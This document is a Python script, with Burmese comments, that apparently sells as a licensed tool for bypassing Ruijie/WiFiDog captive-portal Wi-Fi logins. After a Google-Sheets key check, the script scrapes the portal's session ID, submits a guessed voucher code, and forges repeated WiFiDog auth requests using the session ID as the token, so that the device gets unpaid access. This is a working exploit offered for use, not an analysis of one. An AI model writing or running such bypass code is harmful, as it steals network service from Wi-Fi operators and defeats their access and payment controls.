#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import json
import hashlib
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime, date, timedelta

# SSL Warning များကို ပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM (Hacker UI)
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================

# Google Sheets CSV Link
SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vRuA-gVWBMgfPD6AHHg1SZdYiWtPnUvj7lWegY9KBh5L0NhYZfdpqsSLEEIpcK5zbndI6dZNhYb89cq/pub?output=csv"

LOCAL_KEYS_FILE = os.path.expanduser("~/.moe_yu_approved_keys.txt")
KEY_STORAGE_FILE = os.path.expanduser("~/.moe_yu_device_key.txt")
LICENSE_INFO_FILE = os.path.expanduser("~/.moe_yu_license_info.txt") 

# ===============================
# LICENSE INFO MANAGEMENT (Offline support)
# ===============================
def save_license_info(expiry_date_str):
    """Offline သုံးနိုင်ရန် လိုင်စင်အချက်အလက် သိမ်းဆည်းခြင်း"""
    data = {
        "expiry": expiry_date_str,
        "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "valid": True
    }
    try:
        with open(LICENSE_INFO_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except:
        return False

def load_license_info():
    """သိမ်းထားသော လိုင်စင်အချက်အလက်ကို ပြန်ဖတ်ခြင်း"""
    if os.path.exists(LICENSE_INFO_FILE):
        try:
            with open(LICENSE_INFO_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return None

def is_license_valid_offline(expiry_date_str):
    """Offline ဖြစ်နေချိန် လိုင်စင်သက်တမ်းရှိမရှိ စစ်ဆေးခြင်း"""
    try:
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
        return date.today() <= expiry_date
    except:
        return False

def get_days_left_offline(expiry_date_str):
    """ကျန်ရှိသော သက်တမ်းရက်ကို တွက်ချက်ခြင်း"""
    try:
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
        days_left = (expiry_date - date.today()).days
        return max(0, days_left)
    except:
        return 0

# ===============================
# STABLE SYSTEM KEY
# ===============================
def get_stable_system_key():
    """စက်ပစ္စည်းတစ်ခုချင်းစီအတွက် မပြောင်းလဲသော Key တစ်ခုထုတ်ပေးခြင်း"""
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        # Termux အတွက် uuid ကို ဦးစားပေးသုံးခြင်း
        import uuid
        stable_key = hashlib.md5(f"DEVICE_{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        import string
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

def get_system_key():
    return get_stable_system_key()

def fetch_authorized_keys_with_expiry():
    """Google Sheets မှ ခွင့်ပြုထားသော Key များကို ရယူခြင်း"""
    keys_data = {}
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('keys') and not line.startswith('username'):
                    parts = line.split(',')
                    if len(parts) >= 1:
                        key = parts[0].strip().strip('"')
                        if key:
                            expiry = parts[2].strip().strip('"') if len(parts) > 2 else ""
                            keys_data[key] = expiry
            if keys_data:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        for key, expiry in keys_data.items():
                            f.write(f"{key},{expiry}\n")
                except:
                    pass
            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from online database{RESET}")
            return keys_data
    except Exception as e:
        print(f"{YELLOW}[!] Database error (offline mode): {e}{RESET}")
    
    # Cache မှ ပြန်ဖတ်ခြင်း
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(',')
                        if len(parts) >= 1:
                            key = parts[0]
                            expiry = parts[1] if len(parts) > 1 else ""
                            keys_data[key] = expiry
            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from local cache{RESET}")
            return keys_data
    except:
        pass
    
    return {}

def check_approval():
    print(f"{MAGENTA}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                   MOE YU BYPASS SYSTEM (Hybrid)                        ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    system_key = get_system_key()
    print(f"{WHITE}[*] System Key: {GREEN}{system_key}{RESET}")
    
    # Offline လိုင်စင် အရင်စစ်ဆေးခြင်း
    saved_license = load_license_info()
    if saved_license:
        expiry = saved_license.get('expiry')
        if expiry and is_license_valid_offline(expiry):
            days_left = get_days_left_offline(expiry)
            print(f"{GREEN}[✓] LICENSE ACTIVE (Offline Mode){RESET}")
            print(f"{GREEN}    Expires: {expiry} ({days_left} days left){RESET}")
            time.sleep(1.5)
            return True
        else:
            print(f"{RED}[✗] SAVED LICENSE EXPIRED!{RESET}")
            print(f"{YELLOW}    Will check online for update...{RESET}")
    
    # Online မှ အချက်အလက်ယူခြင်း
    print(f"{CYAN}[*] Checking online for license...{RESET}")
    authorized_keys_data = fetch_authorized_keys_with_expiry()
    
    if system_key in authorized_keys_data:
        expiry_date_str = authorized_keys_data[system_key]
        if expiry_date_str:
            try:
                expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
                today = date.today()
                
                if today > expiry_date:
                    print(f"\n{RED}[✗] KEY EXPIRED!{RESET}")
                    print(f"{YELLOW}Expiry date: {expiry_date_str}{RESET}")
                    if os.path.exists(LICENSE_INFO_FILE):
                        os.remove(LICENSE_INFO_FILE)
                    return False
                else:
                    days_left = (expiry_date - today).days
                    print(f"\n{GREEN}[✓] KEY APPROVED ✓{RESET}")
                    print(f"{GREEN}    Expires: {expiry_date_str} ({days_left} days left){RESET}")
                    save_license_info(expiry_date_str)
                    time.sleep(1.5)
                    return True
            except:
                print(f"\n{GREEN}[✓] KEY APPROVED (Lifetime){RESET}")
                save_license_info("2099-12-31")
                time.sleep(1.5)
                return True
        else:
            print(f"\n{GREEN}[✓] KEY APPROVED (Lifetime){RESET}")
            save_license_info("2099-12-31")
            time.sleep(1.5)
            return True
    else:
        # Offline fallback
        if saved_license:
            expiry = saved_license.get('expiry')
            if expiry and is_license_valid_offline(expiry):
                print(f"\n{GREEN}[✓] USING SAVED LICENSE (Offline Mode){RESET}")
                time.sleep(1.5)
                return True
        
        print(f"\n{RED}[✗] KEY NOT APPROVED{RESET}")
        print(f"{YELLOW}Add '{system_key}' to Column A in Google Sheets{RESET}")
        return False

# ===============================
# CONFIG & LOGGING
# ===============================
PING_THREADS = 3
MIN_INTERVAL = 0.3
MAX_INTERVAL = 0.8
DEBUG = False

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║        Ruijie All Version Bypass     ║
║        Moe Yu Special Edition        ║
╚══════════════════════════════════════╝
{RESET}""")

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
        except:
            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    banner()
    logging.info(f"{CYAN}Initializing Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                logging.warning(f"{RED}Session ID Not Found{RESET}")
                time.sleep(5)
                continue

            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")

            try:
                voucher_api = f"{portal_host}/api/auth/voucher/"
                session.post(
                    voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                    timeout=5
                )
            except:
                pass

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(
                    target=high_speed_ping,
                    args=(auth_link, sid),
                    daemon=True
                ).start()

            while check_real_internet():
                time.sleep(5)

        except Exception as e:
            if DEBUG:
                logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(5)

# ===============================
# ENTRY POINT (Arguments ပါဝင်မှု)
# ===============================
if __name__ == "__main__":
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "--key":
            print(f"\n{GREEN}Your System Key: {get_system_key()}{RESET}")
            sys.exit(0)
        elif arg == "--reset-key":
            if os.path.exists(KEY_STORAGE_FILE): os.remove(KEY_STORAGE_FILE)
            print(f"{GREEN}[✓] Key cleared!{RESET}")
            sys.exit(0)
        elif arg == "--reset-license":
            if os.path.exists(LICENSE_INFO_FILE): os.remove(LICENSE_INFO_FILE)
            print(f"{GREEN}[✓] License cleared!{RESET}")
            sys.exit(0)
    
    if check_approval():
        try:
            start_process()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{RED}Shutdown...{RESET}")
